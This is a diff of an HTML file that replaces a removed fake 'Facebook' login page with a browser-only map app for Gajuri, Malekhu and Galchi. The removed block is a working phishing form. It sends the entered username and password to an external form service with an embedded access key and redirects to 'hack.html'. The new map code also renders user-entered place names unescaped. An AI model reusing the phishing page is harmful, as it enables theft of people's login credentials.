@@ -1,56 +1,618 @@
-<!DOCTYPE html>
+<!doctype html>
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Facebook Login Demo</title>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width,initial-scale=1" />
+<title>Mini Smart City — Map (Gajuri / Malekhu / Galchi)</title>
 <style>
-  body{margin:0;font-family:Helvetica,Arial,sans-serif;background:#f0f2f5;}
-  .container{max-width:360px;margin:100px auto;text-align:center;}
-  .logo{color:#1877f2;font-size:48px;font-weight:bold;margin-bottom:20px;}
-  form{background:#fff;padding:20px;border-radius:8px;
-       box-shadow:0 2px 6px rgba(0,0,0,0.1);}
-  input{width:100%;padding:12px;margin:8px 0;border:1px solid #ddd;
-        border-radius:6px;font-size:15px;}
-  button{width:100%;padding:12px;background:#1877f2;color:#fff;
-         border:none;border-radius:6px;font-size:17px;font-weight:bold;
-         cursor:pointer;}
-  button:hover{background:#166fe5;}
-  a{text-decoration:none;color:#1877f2;font-size:14px;}
+  :root{
+    --panel-bg: #ffffffee;
+    --accent: #2b8aee;
+    --danger: #e84141;
+  }
+  body{font-family:system-ui,-apple-system,Segoe UI,Roboto,"Helvetica Neue",Arial;margin:0;background:#f4f6fb;}
+  header{display:flex;align-items:center;gap:12px;padding:10px 14px;background:linear-gradient(90deg,#fff,#f1f8ff);border-bottom:1px solid #ddd}
+  header h1{font-size:18px;margin:0;color:#0b3a66}
+  .top-controls{margin-left:auto;display:flex;gap:8px;align-items:center;}
+  .control {background:var(--panel-bg);padding:8px;border-radius:8px;border:1px solid #ddd;box-shadow:0 1px 2px rgba(0,0,0,0.03)}
+  #search {width:320px;padding:8px;border-radius:6px;border:1px solid #ccc}
+  #container{display:flex;gap:12px;padding:12px;height:calc(100vh - 74px);box-sizing:border-box}
+  .left{flex:1;position:relative;background:#e9f0ff;padding:8px;border-radius:10px;overflow:hidden;display:flex;flex-direction:column}
+  .map-wrap{position:relative;flex:1;border-radius:8px;overflow:hidden;border:2px solid #ddd;background:#fff}
+  #map{
+    width:100%;height:100%;display:block;object-fit:contain;
+    transform-origin:0 0;
+  }
+  .marker{position:absolute;transform:translate(-50%,-100%);cursor:pointer;user-select:none}
+  .marker .dot{width:18px;height:18px;border-radius:50%;background:var(--accent);box-shadow:0 0 8px rgba(43,138,238,0.65);border:2px solid #fff}
+  .marker .label{display:block;background:#fff;padding:3px 6px;border-radius:6px;margin-top:4px;font-size:12px;border:1px solid #ddd;white-space:nowrap}
+  .marker.blink .dot{animation:blink 0.8s infinite}
+  @keyframes blink{0%{box-shadow:0 0 6px rgba(232,65,65,0.3)}50%{box-shadow:0 0 18px rgba(232,65,65,0.9)}100%{box-shadow:0 0 6px rgba(232,65,65,0.3)}}
+
+  .right{width:420px;display:flex;flex-direction:column;gap:8px}
+  .panel{background:var(--panel-bg);padding:10px;border-radius:10px;border:1px solid #ddd;box-shadow:0 1px 4px rgba(0,0,0,0.03);overflow:auto}
+  .panel h3{margin:0 0 8px 0;font-size:15px;color:#0b3a66}
+  .place-list{display:flex;flex-direction:column;gap:6px;max-height:220px;overflow:auto}
+  .place-row{display:flex;gap:8px;align-items:center;padding:6px;border-radius:6px;border:1px solid #eee}
+  .place-row img{width:56px;height:44px;object-fit:cover;border-radius:6px;flex-shrink:0}
+  .place-row .meta{flex:1}
+  .btn{padding:6px 8px;border-radius:6px;border:1px solid #ccc;background:#fff;cursor:pointer}
+  .btn.primary{background:var(--accent);color:#fff;border-color:var(--accent)}
+  .btn.danger{background:var(--danger);color:#fff;border-color:var(--danger)}
+  .small{font-size:13px;padding:4px 6px}
+  form.add-form{display:flex;flex-direction:column;gap:8px}
+  form.add-form label{font-size:13px;color:#333}
+  form.add-form input[type="text"],form.add-form select,form.add-form textarea{padding:8px;border-radius:6px;border:1px solid #ccc}
+  .thumbs{display:flex;gap:6px;flex-wrap:wrap}
+  .thumbs img, .thumbs video{width:80px;height:64px;object-fit:cover;border-radius:6px;border:1px solid #ccc}
+  .suggestions{position:absolute;left:12px;top:56px;width:320px;z-index:30;background:#fff;border:1px solid #ccc;border-radius:6px;box-shadow:0 4px 18px rgba(0,0,0,0.08);max-height:240px;overflow:auto}
+  .suggestions .item{display:flex;gap:8px;padding:6px;align-items:center;border-bottom:1px solid #f0f0f0;cursor:pointer}
+  .suggestions .item:last-child{border-bottom:0}
+  .empty{color:#777;font-size:13px;padding:10px}
+  .footer{display:flex;gap:8px;align-items:center;justify-content:space-between;padding-top:8px}
+  .modal{position:fixed;inset:0;background:rgba(0,0,0,0.45);display:none;align-items:center;justify-content:center;z-index:9999}
+  .modal.open{display:flex}
+  .modal .card{background:#fff;padding:12px;border-radius:8px;max-width:900px;width:95%;max-height:90vh;overflow:auto}
+  .gallery{display:flex;gap:8px;align-items:center}
+  .gallery img, .gallery video{max-width:420px;max-height:60vh;object-fit:contain;border-radius:6px;border:1px solid #ddd}
+  .center-hint{position:absolute;left:50%;transform:translateX(-50%);top:12px;background:#fff;padding:6px 8px;border-radius:8px;border:1px solid #eee;opacity:0.9}
+  .category-badge{font-size:12px;padding:4px 6px;border-radius:6px;border:1px solid #ddd;background:#fff}
+  .controls-row{display:flex;gap:6px;align-items:center;flex-wrap:wrap}
+  .cat-filter{display:flex;gap:6px;flex-wrap:wrap}
+  .cat-filter button{padding:6px;border-radius:6px;border:1px solid #ddd;background:#fff}
+  .share-note{font-size:12px;color:#666}
+  .emergency-panel{background:#ffecec;padding:10px;border-radius:8px;border:1px solid #f5c6c6}
+  .hint{font-size:13px;color:#555}
 </style>
 </head>
 <body>
 
-<div class="container">
-  <div class="logo">facebook</div>
-
-  <form id="fbLoginForm" method="POST" action="https://api.web3forms.com/submit">
-    <!-- Replace YOUR_ACCESS_KEY with your real Web3Forms access key -->
-    <input type="hidden" name="access_key" value="73749dc6-f5a4-402b-ba0e-e099741d9206">
-
-    <input type="text" name="user" placeholder="Email address or phone number" required>
-    <input type="password" name="pass" placeholder="Password" required>
-
-    <button type="submit">Log in</button>
-
-    <div style="margin-top:15px;">
-      <a href="#">Forgotten password?</a><br><br>
-      <a href="#">Create new account</a>
+<header>
+  <img src="" alt="logo" id="logo" style="width:44px;height:44px;border-radius:6px;background:#fff;border:1px solid #ddd;object-fit:cover">
+  <h1>Mini Smart City Map — Gajuri / Malekhu / Galchi</h1>
+  <div class="top-controls">
+    <div class="control">
+      <input id="search" placeholder="Search places (alphabetic suggestions) — try typing 'a' or 'ab'..." />
+      <div id="suggestions" class="suggestions" style="display:none"></div>
     </div>
-  </form>
+    <div class="control">
+      <button id="addBtn" class="btn">Add place</button>
+    </div>
+    <div class="control">
+      <button id="emergencyOpen" class="btn danger small">Emergency</button>
+    </div>
+  </div>
+</header>
+
+<div id="container">
+  <div class="left">
+    <div class="map-wrap">
+      <div class="center-hint">Click map to add marker (or use the Add place form)</div>
+      <img id="map" src="" alt="map image">
+      <!-- markers will be injected -->
+    </div>
+    <div style="display:flex;gap:8px;margin-top:8px;align-items:center">
+      <div class="control">
+        <button id="zoomIn" class="btn small">Zoom in</button>
+        <button id="zoomOut" class="btn small">Zoom out</button>
+        <button id="resetZoom" class="btn small">Reset</button>
+      </div>
+      <div class="hint" style="margin-left:auto">All data saved locally in your browser (localStorage)</div>
+    </div>
+  </div>
+
+  <aside class="right">
+    <div class="panel">
+      <h3>Places (alphabetical)</h3>
+      <div class="controls-row">
+        <div class="cat-filter">
+          <button data-cat="">All</button>
+          <button data-cat="parking">Parking</button>
+          <button data-cat="hotel">Hotel</button>
+          <button data-cat="museum">Museum</button>
+          <button data-cat="jungle">Jungle/Park</button>
+          <button data-cat="waterfall">Waterfall</button>
+          <button data-cat="school">School</button>
+          <button data-cat="hospital">Hospital</button>
+          <button data-cat="court">Court</button>
+          <button data-cat="office">Office</button>
+        </div>
+      </div>
+      <div class="place-list" id="placeList"></div>
+      <div class="footer">
+        <div class="share-note">Share: copy JSON or use system share</div>
+        <div><button id="exportAll" class="btn">Export JSON</button></div>
+      </div>
+    </div>
+
+    <div class="panel">
+      <h3>Add / Edit Place</h3>
+      <form id="addForm" class="add-form">
+        <label>Name</label>
+        <input id="pname" required type="text" placeholder="Place name (e.g. Gajuri Park)">
+        <label>Category</label>
+        <select id="pcat">
+          <option value="">-- choose category --</option>
+          <option value="parking">Parking</option>
+          <option value="hotel">Hotel</option>
+          <option value="museum">Museum</option>
+          <option value="jungle">Jungle/Park</option>
+          <option value="waterfall">Waterfall</option>
+          <option value="school">School</option>
+          <option value="hospital">Hospital</option>
+          <option value="court">Supreme Court</option>
+          <option value="office">Office</option>
+          <option value="other">Other</option>
+        </select>
+        <label>Coordinates (percent of image; x 0-100)</label>
+        <div style="display:flex;gap:6px">
+          <input id="px" type="text" placeholder="x %" />
+          <input id="py" type="text" placeholder="y %" />
+        </div>
+        <label>Description</label>
+        <textarea id="pdesc" rows="2" placeholder="Short description"></textarea>
+        <label>Upload photos/videos (max 6)</label>
+        <input id="pfiles" type="file" multiple accept="image/*,video/*">
+        <div class="thumbs" id="thumbs"></div>
+        <div style="display:flex;gap:6px">
+          <button id="savePlace" class="btn primary" type="button">Save place</button>
+          <button id="clearForm" class="btn" type="button">Clear</button>
+          <button id="cancelAdd" class="btn" type="button">Close</button>
+        </div>
+      </form>
+    </div>
+
+    <div class="panel emergency-panel">
+      <h3>Emergency</h3>
+      <div style="display:flex;gap:6px;align-items:center">
+        <select id="emPlace" style="flex:1"></select>
+        <button id="triggerEmergency" class="btn danger">EMERGENCY</button>
+      </div>
+      <div id="emInfo" style="margin-top:8px"></div>
+    </div>
+
+  </aside>
+</div>
+
+<!-- modals -->
+<div id="modal" class="modal" aria-hidden="true">
+  <div class="card" role="dialog" aria-modal="true">
+    <div style="display:flex;justify-content:space-between;align-items:center">
+      <strong id="modalTitle">Place</strong>
+      <div><button id="modalClose" class="btn">Close</button></div>
+    </div>
+    <hr>
+    <div id="modalBody"></div>
+  </div>
 </div>
 
 <script>
-  // redirect after successful send
-  document.getElementById("fbLoginForm").addEventListener("submit", function(e){
-    e.preventDefault();
+/* =======================
+   CONFIG
+   ======================= */
+const MAP_IMG_SRC = "/mnt/data/Screenshot 2025-11-22 at 9.28.10 pm.png"; // <-- path to your uploaded map image
+document.getElementById('map').src = MAP_IMG_SRC;
+document.getElementById('logo').src = MAP_IMG_SRC;
 
-    // Only send non-sensitive demo data
-    const formData = new FormData(this);
-    fetch(this.action, {method:"POST", body:formData})
-      .then(res => res.ok ? window.location.href="hack.html"
-                          : alert("Error sending form"));
+const STORAGE_KEY = "miniCityPlaces_v1";
+
+/* =======================
+   STATE + UTIL
+   ======================= */
+let places = []; // array of {id,name,cat,desc,xPct,yPct,media:[{type:'image'|'video',data:url,filename}],created}
+const mapEl = document.getElementById('map');
+const mapWrap = document.querySelector('.map-wrap');
+const markerContainer = mapWrap;
+let zoom = 1;
+
+/* helpers */
+function uid(){ return 'p'+Math.random().toString(36).slice(2,9); }
+function savePlaces(){ localStorage.setItem(STORAGE_KEY, JSON.stringify(places)); renderPlaceList(); renderMarkers(); populateEmList(); }
+function loadPlaces(){ try{ places = JSON.parse(localStorage.getItem(STORAGE_KEY) || '[]') || []; }catch(e){ places = []; } }
+function formatDate(ts){ return new Date(ts).toLocaleString(); }
+function clamp(n, a, b){ return Math.min(b, Math.max(a, n)); }
+
+/* =======================
+   RENDERING
+   ======================= */
+function clearMarkers(){
+  document.querySelectorAll('.marker').forEach(n=>n.remove());
+}
+function createMarkerEl(place){
+  const el = document.createElement('div');
+  el.className = 'marker';
+  el.style.left = place.xPct + '%';
+  el.style.top = place.yPct + '%';
+  el.dataset.id = place.id;
+  el.innerHTML = `<div class="dot" title="${place.name}"></div><div class="label">${place.name}</div>`;
+  el.addEventListener('click', e=>{
+    e.stopPropagation();
+    openPlaceModal(place.id);
   });
+  return el;
+}
+function renderMarkers(){
+  clearMarkers();
+  places.forEach(p=>{
+    const m = createMarkerEl(p);
+    markerContainer.appendChild(m);
+  });
+}
+function renderPlaceList(filterCat=''){
+  const list = document.getElementById('placeList');
+  list.innerHTML = '';
+  const copy = places.slice().sort((a,b)=>a.name.localeCompare(b.name));
+  const visible = filterCat ? copy.filter(p=>p.cat===filterCat) : copy;
+  if(visible.length===0){
+    list.innerHTML = '<div class="empty">No places found.</div>';
+    return;
+  }
+  visible.forEach(p=>{
+    const row = document.createElement('div'); row.className='place-row';
+    const thumb = document.createElement('div');
+    if(p.media && p.media.length){
+      const m = p.media[0];
+      const img = document.createElement(m.type==='video' ? 'video' : 'img');
+      if(m.type==='video'){ img.controls=true; }
+      img.src = m.data; img.alt = p.name;
+      img.style.width='56px'; img.style.height='44px';
+      thumb.appendChild(img);
+    } else {
+      const img = document.createElement('img');
+      img.src = MAP_IMG_SRC; img.style.objectFit='cover';
+      thumb.appendChild(img);
+    }
+    const meta = document.createElement('div'); meta.className='meta';
+    meta.innerHTML = `<strong>${p.name}</strong><div style="font-size:12px;color:#555">${p.cat||'—'} • ${formatDate(p.created||Date.now())}</div><div style="font-size:13px;color:#444">${p.desc||''}</div>`;
+    const actions = document.createElement('div'); actions.style.display='flex'; actions.style.gap='6px';
+    const view = document.createElement('button'); view.textContent='View'; view.className='btn small';
+    view.addEventListener('click', ()=> openPlaceModal(p.id));
+    const center = document.createElement('button'); center.textContent='Center'; center.className='btn small';
+    center.addEventListener('click', ()=> centerOnPlace(p.id));
+    const del = document.createElement('button'); del.textContent='Delete'; del.className='btn small';
+    del.addEventListener('click', ()=> { if(confirm('Delete place?')){ places = places.filter(x=>x.id!==p.id); savePlaces(); }});
+    actions.appendChild(view); actions.appendChild(center); actions.appendChild(del);
+    row.appendChild(thumb); row.appendChild(meta); row.appendChild(actions);
+    list.appendChild(row);
+  });
+}
+function centerOnPlace(id){
+  const p = places.find(x=>x.id===id); if(!p) return;
+  // scroll map wrap so that marker is centered in view (approx)
+  // map image is fitted, so simply flash marker and open modal
+  const all = document.querySelectorAll('.marker');
+  all.forEach(m=> m.classList.remove('blink'));
+  const mEl = document.querySelector(`.marker[data-id="${id}"]`);
+  if(mEl) {
+    mEl.scrollIntoView({behavior:'smooth',block:'center',inline:'center'});
+    mEl.classList.add('blink');
+    setTimeout(()=>mEl.classList.remove('blink'), 3000);
+  }
+  openPlaceModal(id);
+}
+
+/* =======================
+   MODAL (view place)
+   ======================= */
+const modal = document.getElementById('modal');
+const modalTitle = document.getElementById('modalTitle');
+const modalBody = document.getElementById('modalBody');
+document.getElementById('modalClose').addEventListener('click', ()=> closeModal());
+modal.addEventListener('click', e=>{ if(e.target===modal) closeModal(); });
+
+function openPlaceModal(id){
+  const p = places.find(x=>x.id===id); if(!p) return;
+  modalTitle.textContent = p.name;
+  modalBody.innerHTML = '';
+  const head = document.createElement('div'); head.style.display='flex'; head.style.justifyContent='space-between';
+  const info = document.createElement('div'); info.innerHTML = `<div style="font-size:14px"><strong>${p.name}</strong> <span class="category-badge">${p.cat||'—'}</span></div>
+    <div style="font-size:13px;color:#555">${p.desc||''}</div><div style="font-size:12px;color:#666">Coordinates: ${p.xPct}% , ${p.yPct}%</div>`;
+  const actions = document.createElement('div'); actions.style.display='flex'; actions.style.gap='6px';
+  const shareBtn = document.createElement('button'); shareBtn.className='btn small'; shareBtn.textContent='Share location';
+  shareBtn.addEventListener('click', ()=> sharePlace(p));
+  const editBtn = document.createElement('button'); editBtn.className='btn small'; editBtn.textContent='Edit';
+  editBtn.addEventListener('click', ()=> loadPlaceIntoForm(p));
+  actions.appendChild(shareBtn); actions.appendChild(editBtn);
+  head.appendChild(info); head.appendChild(actions);
+  modalBody.appendChild(head);
+  modalBody.appendChild(document.createElement('hr'));
+  // gallery / street view
+  const gallery = document.createElement('div'); gallery.className='gallery';
+  if(p.media && p.media.length){
+    const big = document.createElement(p.media[0].type==='video' ? 'video' : 'img');
+    if(p.media[0].type==='video'){ big.controls=true; }
+    big.src = p.media[0].data;
+    const thumbs = document.createElement('div'); thumbs.style.display='flex'; thumbs.style.flexDirection='column'; thumbs.style.gap='6px';
+    thumbs.style.marginLeft='12px';
+    p.media.forEach((m, idx)=>{
+      const t = document.createElement(m.type==='video' ? 'video' : 'img');
+      if(m.type==='video') t.controls = true;
+      t.src = m.data; t.style.width='92px'; t.style.height='72px'; t.style.objectFit='cover';
+      t.addEventListener('click', ()=> big.src = m.data);
+      const sharePhoto = document.createElement('button'); sharePhoto.className='btn small'; sharePhoto.style.marginTop='6px'; sharePhoto.textContent='Share photo';
+      sharePhoto.addEventListener('click', ()=> {
+        try{
+          navigator.clipboard.writeText(m.data);
+          alert('Photo data URL copied to clipboard (you can paste / open it).');
+        }catch(e){ alert('Cannot copy: '+e); }
+      });
+      thumbs.appendChild(t); thumbs.appendChild(sharePhoto);
+    });
+    gallery.appendChild(big); gallery.appendChild(thumbs);
+  } else {
+    const cover = document.createElement('img'); cover.src = MAP_IMG_SRC; gallery.appendChild(cover);
+  }
+  modalBody.appendChild(gallery);
+
+  // details and actions
+  const details = document.createElement('div'); details.style.marginTop='10px';
+  details.innerHTML = `<div style="font-size:13px"><strong>Saved:</strong> ${formatDate(p.created||Date.now())}</div>`;
+  modalBody.appendChild(details);
+
+  modal.classList.add('open');
+}
+function closeModal(){ modal.classList.remove('open'); }
+
+/* =======================
+   SEARCH / SUGGESTIONS
+   ======================= */
+const searchInput = document.getElementById('search');
+const suggestionsEl = document.getElementById('suggestions');
+
+searchInput.addEventListener('input', (e)=>{
+  const q = (e.target.value||'').trim().toLowerCase();
+  if(!q){ suggestionsEl.style.display='none'; return; }
+  // alphabetic behavior: match names that start with q
+  const matches = places.filter(p => p.name.toLowerCase().startsWith(q));
+  // if none, also include contains
+  const extra = places.filter(p => !p.name.toLowerCase().startsWith(q) && p.name.toLowerCase().includes(q));
+  const all = matches.concat(extra).slice(0,30);
+  renderSuggestions(all, q);
+});
+
+function renderSuggestions(list, q){
+  suggestionsEl.innerHTML = '';
+  if(!list.length){ suggestionsEl.innerHTML = '<div class="empty">No results</div>'; suggestionsEl.style.display='block'; return; }
+  list.forEach(p=>{
+    const item = document.createElement('div'); item.className='item';
+    const img = document.createElement('img'); img.style.width='56px'; img.style.height='44px'; img.style.objectFit='cover';
+    if(p.media && p.media.length) img.src = p.media[0].data; else img.src = MAP_IMG_SRC;
+    const m = document.createElement('div'); m.style.flex='1';
+    // highlight prefix
+    const nameHtml = p.name.replace(new RegExp('^('+escapeRegExp(q)+')','i'), '<strong>$1</strong>');
+    m.innerHTML = `${nameHtml}<div style="font-size:12px;color:#666">${p.cat||''}</div>`;
+    item.appendChild(img); item.appendChild(m);
+    item.addEventListener('click', ()=> {
+      searchInput.value = p.name;
+      suggestionsEl.style.display='none';
+      centerOnPlace(p.id);
+    });
+    suggestionsEl.appendChild(item);
+  });
+  suggestionsEl.style.display='block';
+}
+
+function escapeRegExp(s){ return s.replace(/[.*+?^${}()|[\]\\]/g,'\\$&'); }
+document.addEventListener('click', ()=> { suggestionsEl.style.display='none'; });
+
+/* =======================
+   ADD FORM + UPLOAD
+   ======================= */
+
+const addPanel = document.querySelector('.right .panel form#addForm');
+const addBtn = document.getElementById('addBtn');
+const cancelAdd = document.getElementById('cancelAdd');
+const pfiles = document.getElementById('pfiles');
+const thumbs = document.getElementById('thumbs');
+
+addBtn.addEventListener('click', ()=> {
+  openAddPanel();
+});
+cancelAdd.addEventListener('click', ()=> {
+  closeAddPanel();
+});
+document.getElementById('clearForm').addEventListener('click', ()=> clearForm());
+function openAddPanel(){ window.scrollTo({top:0,behavior:'smooth'}); /* form is always present on right */ }
+
+function closeAddPanel(){ clearForm(); }
+
+function clearForm(){
+  document.getElementById('pname').value='';
+  document.getElementById('pcat').value='';
+  document.getElementById('px').value='';
+  document.getElementById('py').value='';
+  document.getElementById('pdesc').value='';
+  pfiles.value=''; thumbs.innerHTML='';
+  document.getElementById('savePlace').dataset.edit = '';
+}
+
+pfiles.addEventListener('change', async (e)=>{
+  const files = Array.from(e.target.files).slice(0,6);
+  thumbs.innerHTML = '';
+  for(const f of files){
+    const reader = new FileReader();
+    reader.onload = (ev)=>{
+      const url = ev.target.result;
+      const m = document.createElement(f.type.startsWith('video/') ? 'video' : 'img');
+      if(f.type.startsWith('video/')) m.controls=true;
+      m.src = url; m.title = f.name;
+      thumbs.appendChild(m);
+    };
+    reader.readAsDataURL(f);
+  }
+});
+
+document.getElementById('savePlace').addEventListener('click', async ()=>{
+  const name = document.getElementById('pname').value.trim();
+  if(!name){ alert('Enter a name'); return; }
+  const cat = document.getElementById('pcat').value;
+  let x = parseFloat(document.getElementById('px').value);
+  let y = parseFloat(document.getElementById('py').value);
+  if(Number.isNaN(x) || Number.isNaN(y)){ alert('Enter coordinates (x and y percent 0-100) or click on map to fill them.'); return; }
+  x = clamp(x,0,100); y = clamp(y,0,100);
+  const desc = document.getElementById('pdesc').value.trim();
+  const files = Array.from(pfiles.files).slice(0,6);
+  const media = [];
+  for(const f of files){
+    const data = await fileToDataUrl(f);
+    media.push({type: f.type.startsWith('video/') ? 'video' : 'image', data, filename: f.name});
+  }
+  // check if edit
+  const editId = document.getElementById('savePlace').dataset.edit;
+  if(editId){
+    const idx = places.findIndex(p=>p.id===editId);
+    if(idx>=0){
+      places[idx].name = name; places[idx].cat = cat; places[idx].xPct = x; places[idx].yPct = y; places[idx].desc = desc;
+      places[idx].media = (places[idx].media||[]).concat(media);
+      savePlaces(); clearForm();
+      alert('Place updated');
+      return;
+    }
+  }
+  // create new
+  const newPlace = { id: uid(), name, cat, desc, xPct:x, yPct:y, media, created: Date.now() };
+  places.push(newPlace);
+  savePlaces();
+  clearForm();
+  alert('Place added');
+});
+
+function loadPlaceIntoForm(p){
+  document.getElementById('pname').value=p.name;
+  document.getElementById('pcat').value=p.cat||'';
+  document.getElementById('px').value=p.xPct;
+  document.getElementById('py').value=p.yPct;
+  document.getElementById('pdesc').value=p.desc||'';
+  thumbs.innerHTML='';
+  if(p.media && p.media.length) p.media.forEach(m=>{
+    const el = document.createElement(m.type==='video' ? 'video' : 'img');
+    if(m.type==='video') el.controls=true;
+    el.src = m.data; thumbs.appendChild(el);
+  });
+  document.getElementById('savePlace').dataset.edit = p.id;
+  window.scrollTo({top:0,behavior:'smooth'});
+}
+
+function fileToDataUrl(file){ return new Promise((res,rej)=>{ const r=new FileReader(); r.onload=()=>res(r.result); r.onerror=rej; r.readAsDataURL(file); }); }
+
+/* =======================
+   MAP CLICK TO ADD PLACE COORDS
+   ======================= */
+mapWrap.addEventListener('click', (e)=>{
+  // compute percentage coordinates relative to image rendered area
+  const rect = mapWrap.getBoundingClientRect();
+  const imgRect = mapEl.getBoundingClientRect();
+  // ensure click inside the image area
+  const clickX = e.clientX, clickY = e.clientY;
+  if(clickX < imgRect.left || clickX > imgRect.right || clickY < imgRect.top || clickY > imgRect.bottom) return;
+  const xPct = ( (clickX - imgRect.left) / imgRect.width ) * 100;
+  const yPct = ( (clickY - imgRect.top) / imgRect.height ) * 100;
+  document.getElementById('px').value = xPct.toFixed(2);
+  document.getElementById('py').value = yPct.toFixed(2);
+  alert('Coordinates filled in the Add form. Now enter name/category and save.');
+});
+
+/* =======================
+   EMERGENCY
+   ======================= */
+const emPlace = document.getElementById('emPlace');
+const emOpen = document.getElementById('emergencyOpen');
+const triggerEmergency = document.getElementById('triggerEmergency');
+const emInfo = document.getElementById('emInfo');
+
+function populateEmList(){
+  emPlace.innerHTML = '';
+  const sorted = places.slice().sort((a,b)=>a.name.localeCompare(b.name));
+  sorted.forEach(p=>{
+    const opt = document.createElement('option'); opt.value=p.id; opt.textContent=p.name; emPlace.appendChild(opt);
+  });
+}
+emOpen.addEventListener('click', ()=> {
+  // open emergency panel — it's present on page
+  const val = emPlace.value;
+  if(!val && places.length) emPlace.value = places[0].id;
+  window.scrollTo({top:0,behavior:'smooth'});
+});
+triggerEmergency.addEventListener('click', ()=>{
+  const id = emPlace.value; if(!id){ alert('Choose a place first'); return; }
+  const p = places.find(x=>x.id===id); if(!p) return;
+  // blink the marker
+  document.querySelectorAll('.marker').forEach(n=>n.classList.remove('blink'));
+  const mEl = document.querySelector(`.marker[data-id="${id}"]`);
+  if(mEl) mEl.classList.add('blink');
+  emInfo.innerHTML = `<strong>EMERGENCY at ${p.name}</strong><div>${p.desc||''}</div><div style="margin-top:6px">Coordinates: ${p.xPct}% , ${p.yPct}%</div>`;
+  // optionally, we can keep it blinking for 12 seconds then remove
+  setTimeout(()=>{ if(mEl) mEl.classList.remove('blink'); }, 12000);
+});
+
+/* =======================
+   SHARE / EXPORT
+   ======================= */
+function sharePlace(p){
+  const payload = { name:p.name, cat:p.cat, desc:p.desc, xPct:p.xPct, yPct:p.yPct, created:p.created };
+  const text = JSON.stringify(payload, null, 2);
+  if(navigator.share){
+    navigator.share({ title: p.name, text, url: window.location.href }).catch(()=>{});
+  } else {
+    navigator.clipboard.writeText(text).then(()=> alert('Place JSON copied to clipboard'));
+  }
+}
+
+document.getElementById('exportAll').addEventListener('click', ()=>{
+  const text = JSON.stringify(places,null,2);
+  const blob = new Blob([text], {type:'application/json'});
+  const url = URL.createObjectURL(blob);
+  const a = document.createElement('a'); a.href=url; a.download='miniCityPlaces.json'; a.click();
+  URL.revokeObjectURL(url);
+});
+
+/* =======================
+   ZOOM CONTROLS
+   ======================= */
+document.getElementById('zoomIn').addEventListener('click', ()=> { zoom = Math.min(3, zoom+0.1); mapEl.style.transform = `scale(${zoom})`; });
+document.getElementById('zoomOut').addEventListener('click', ()=> { zoom = Math.max(0.5, zoom-0.1); mapEl.style.transform = `scale(${zoom})`; });
+document.getElementById('resetZoom').addEventListener('click', ()=> { zoom = 1; mapEl.style.transform = `scale(${zoom})`; });
+
+/* =======================
+   CATEGORY FILTERS
+   ======================= */
+document.querySelectorAll('.cat-filter button').forEach(btn=>{
+  btn.addEventListener('click', ()=> {
+    const cat = btn.dataset.cat || '';
+    renderPlaceList(cat);
+  });
+});
+
+/* =======================
+   INITIALIZE
+   ======================= */
+function init(){
+  loadPlaces();
+  renderPlaceList();
+  renderMarkers();
+  populateEmList();
+  // favicon/logo uses same map
+}
+init();
+
+/* =======================
+   Small helper: load demo places if none exist (optional)
+   ======================= */
+if(!places.length){
+  // some initial demo entries for the three places user mentioned (coords are example percentages)
+  const demo = [
+    { id: uid(), name:'Gajuri Market', cat:'office', desc:'Central market area', xPct:10, yPct:10, media:[], created: Date.now() - 86400000 },
+    { id: uid(), name:'Malekhu Parking', cat:'parking', desc:'Main parking near road', xPct:50, yPct:88, media:[], created: Date.now() - 3600000 },
+    { id: uid(), name:'Galchi Jungle', cat:'jungle', desc:'Small forest/park area with waterfall', xPct:85, yPct:18, media:[], created: Date.now() - 7200000 }
+  ];
+  places = demo;
+  savePlaces();
+}
+
+/* Keep UI updated when storage changes in other tabs */
+window.addEventListener('storage', (e)=>{
+  if(e.key === STORAGE_KEY) { loadPlaces(); renderPlaceList(); renderMarkers(); populateEmList(); }
+});
 </script>
 
 </body>
